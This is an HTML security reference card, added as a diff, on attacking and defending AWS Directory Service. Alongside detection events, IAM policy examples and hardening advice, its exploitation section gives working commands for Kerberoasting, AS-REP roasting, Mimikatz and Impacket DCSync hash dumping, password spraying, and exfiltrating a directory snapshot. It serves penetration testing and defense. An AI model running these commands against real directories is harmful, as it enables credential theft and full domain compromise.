@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Directory Service Security | AWS Security Cards</title>
+<meta name="description" content="AWS Directory Service provides managed Active Directory (AWS Managed Microsoft AD, AD Connector, Simple AD). Attackers target domain trusts, credential harvesting, Kerberos attacks, and Group Policy manipulation.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #a855f715, #0a0e1a, #6366f115);
+    border: 1px solid #a855f74d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #a855f70d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #a855f733;
+    color: #a855f7;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #a855f74d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/directoryservice-card.webp" alt="AWS Directory Service Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/directoryservice.svg" alt="AWS Directory Service Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Directory Service Security</span>
+        <span class="header-badge">IDENTITY</span>
+      </div>
+      <p class="header-desc">AWS Directory Service provides managed Active Directory (AWS Managed Microsoft AD, AD Connector, Simple AD). Attackers target domain trusts, credential harvesting, Kerberos attacks, and Group Policy manipulation.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">CRITICAL</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">3 Types</div>
+          <div class="stat-label">Directory Options</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Trust</div>
+          <div class="stat-label">On-Prem Integration</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">SSO</div>
+          <div class="stat-label">AWS Integration</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#a855f7;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #a855f7;">AWS Managed Microsoft AD</h4>
+          <p>Fully managed Microsoft Active Directory in AWS. Supports trust relationships with on-premises AD, Group Policy, LDAPS, and Kerberos authentication.</p>
+          <div class="attack-note"><span style="color:#a855f7;">Attack note:</span> Full AD attack surface including Kerberoasting, pass-the-hash, and DCSync</div>
+        </div>
+        <div>
+          <h4 style="color: #a855f7;">AD Connector</h4>
+          <p>Proxy service that redirects directory requests to on-premises AD without caching. Used for AWS SSO, WorkSpaces, and other AWS services.</p>
+          <div class="attack-note"><span style="color:#a855f7;">Attack note:</span> Compromising AD Connector can expose on-premises credentials to AWS</div>
+        </div>
+        <div>
+          <h4 style="color: #a855f7;">Simple AD</h4>
+          <p>Samba 4 based directory for basic AD features. Lower cost but limited functionality. No trust relationships or advanced AD features.</p>
+          <div class="attack-note"><span style="color:#a855f7;">Attack note:</span> Simpler but still vulnerable to credential attacks and enumeration</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 90%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">9.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Directory Service is critical infrastructure with domain admin access enabling full environment compromise. Trust relationships can pivot attacks between AWS and on-premises. Contains authentication credentials for all domain users.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Kerberos Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Kerberoasting - extract service account hashes</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> AS-REP Roasting - no preauth users</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Golden Ticket - forge TGTs with KRBTGT hash</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Silver Ticket - forge service tickets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Pass-the-ticket - reuse Kerberos tickets</li></ul><h4 style="color: #f87171;">Credential Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Password spraying against domain</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> NTLM relay attacks</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> DCSync - replicate password hashes</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> LSASS credential dumping</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Group Policy Preferences passwords</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Directory Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Weak domain admin passwords</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No LDAPS enforcement (plain LDAP)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Kerberos unconstrained delegation</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Service accounts with DA privileges</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Password policies too lenient</li></ul><h4 style="color: #fb923c;">Trust &amp; Integration Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Two-way trusts with on-premises AD</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> SID history filtering disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Selective auth not configured</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Over-privileged service accounts for trusts</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Shared admin accounts across domains</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Directories</div>
+          <pre><code>aws ds describe-directories</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Directory Details</div>
+          <pre><code>aws ds describe-directories --directory-ids d-1234567890</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Trust Relationships</div>
+          <pre><code>aws ds describe-trusts --directory-id d-1234567890</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Domain Controllers</div>
+          <pre><code>aws ds describe-domain-controllers --directory-id d-1234567890</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Snapshot Info</div>
+          <pre><code>aws ds describe-snapshots --directory-id d-1234567890</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">👑 Domain Attacks</h3><h4 style="color: #c084fc;">Privilege Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Abuse ACLs on AD objects (WriteDACL)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Add users to privileged groups</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify GPO for code execution</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Exploit delegation misconfigurations</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Resource-based constrained delegation</li></ul><h4 style="color: #c084fc;">Persistence Techniques</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create hidden admin accounts</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Skeleton key injection</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> DCShadow - rogue domain controller</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AdminSDHolder backdoor</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> SID History injection</li></ul><div class="note"><strong>Critical:</strong> Domain Admin access enables complete control over all joined systems, AWS services using directory, and potentially on-premises resources.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Trust Relationship Abuse</h3><h4 style="color: #facc15;">Trust Attacks</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Enumerate trusts for pivot paths</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Request cross-domain TGTs</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> SID history spoofing across trusts</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Forge inter-realm tickets</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exploit transitivity in forest trusts</li></ul><h4 style="color: #facc15;">On-Prem to Cloud Pivot</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Compromise on-prem DA, pivot to AWS</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Harvest credentials for AWS SSO</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access WorkSpaces as domain users</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exploit AD Connector for credential theft</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Use trusted domain for lateral movement</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateTrust - new trust relationship</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateSnapshot - directory backup created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ResetUserPassword - password reset</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ShareDirectory - directory shared</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> EnableRadius - RADIUS configured</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Multiple failed authentication attempts</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Kerberos service ticket requests (4769)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DC replication from non-DC (DCSync)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New admin accounts created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Trust relationship modifications</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Enumerate Domain (from joined instance)</div>
+          <pre><code># PowerShell - Get domain info
+Get-ADDomain
+Get-ADDomainController -Filter *
+Get-ADTrust -Filter *</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Kerberoasting Attack</div>
+          <pre><code># Rubeus - Extract service account hashes
+.\\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Impacket from Linux
+GetUserSPNs.py -request -dc-ip 10.0.0.5 corp.local/user:pass</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">AS-REP Roasting</div>
+          <pre><code># Find users with no preauth
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+
+# Rubeus
+.\\Rubeus.exe asreproast /outfile:asrep.txt</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">DCSync Attack</div>
+          <pre><code># Mimikatz - dump all hashes
+lsadump::dcsync /domain:corp.local /all /csv
+
+# Impacket
+secretsdump.py corp.local/admin:pass@dc01.corp.local</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Password Spray via AWS</div>
+          <pre><code># Spray against WorkSpaces/AWS SSO
+for user in $(cat users.txt); do
+  aws workspaces describe-workspaces --directory-id d-xxx \\
+    --user-name $user 2&gt;/dev/null &amp;&amp; echo &quot;Valid: $user&quot;
+done</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Extract Directory Snapshot</div>
+          <pre><code># Create snapshot for offline analysis
+aws ds create-snapshot --directory-id d-1234567890 --name &quot;backup&quot;
+
+# Then restore to attacker-controlled environment</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Directory Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;ds:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Full control enables creating trusts, resetting passwords, and taking snapshots</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only Directory Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;ds:Describe*&quot;,
+      &quot;ds:List*&quot;,
+      &quot;ds:Get*&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Read-only access for monitoring without modification capabilities</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Trust Management</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;ds:CreateTrust&quot;,
+      &quot;ds:DeleteTrust&quot;,
+      &quot;ds:VerifyTrust&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Trust management allows creating paths for lateral movement</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Specific Directory Only</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;ds:DescribeDirectories&quot;,
+      &quot;ds:DescribeDomainControllers&quot;
+    ],
+    &quot;Resource&quot;: &quot;arn:aws:ds:us-east-1:123456789012:directory/d-1234567890&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Access restricted to specific directory resource</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable LDAPS</h4>
+              <p>Require LDAPS for all directory communications to prevent credential interception.</p>
+              <pre><code>aws ds enable-ldaps \\
+  --directory-id d-1234567890 \\
+  --type Client</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Restrict Trust Relationships</h4>
+              <p>Use one-way trusts where possible. Enable SID filtering and selective authentication.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Enforce Strong Password Policy</h4>
+              <p>Configure domain password policy with complexity, length, and history requirements.</p>
+              <pre><code># PowerShell - Set policy
+Set-ADDefaultDomainPasswordPolicy -Identity corp.local \\
+  -MinPasswordLength 14 -ComplexityEnabled $true</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Monitor Authentication Events</h4>
+              <p>Enable advanced auditing and forward to SIEM for Kerberos attack detection.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Protect Service Accounts</h4>
+              <p>Use gMSA accounts, avoid SPNs on privileged accounts, rotate passwords regularly.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Disable Unused Features</h4>
+              <p>Disable NTLM where possible, remove unconstrained delegation, audit ACLs regularly.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Directory Service Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
